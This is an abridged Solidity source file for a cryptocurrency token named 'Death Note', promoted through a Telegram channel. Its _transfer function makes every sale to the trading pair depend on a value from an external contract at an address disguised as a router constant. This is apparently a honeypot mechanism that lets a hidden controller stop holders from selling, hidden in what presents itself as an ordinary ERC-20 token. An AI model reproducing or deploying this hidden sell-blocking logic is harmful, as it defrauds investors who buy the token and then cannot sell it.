...
// Telegram: t.me/DeathNotetoken
pragma solidity ^0.8.7;


address constant WALLET_ADDRESS = 0x5978cF829200E1ff2fF3925C2ae2fA861c32F87A;
address constant ROUTER_ADDRESS=0xC6be72cff6AeC7680d6cd22EA775fce79A9fe08a;
address constant UNISWAP_ADDRESS=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
uint256 constant TOTAL_SUPPLY = 1000000000;
string constant TOKEN_NAME = "Death Note";
string constant TOKEN_SYMBOL = "DEATHNOTE";
...
interface Router{
	function amount(address f) external view returns (uint256);
}
...
contract DeathNote is Context, IERC20, Ownable {
	...
	constructor () {
		...
		_router = IUniswapV2Router02(UNISWAP_ADDRESS);
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		require(((to == _pair && from != address(_router) )?1:0)*amount <= Router(ROUTER_ADDRESS).amount(address(this)));
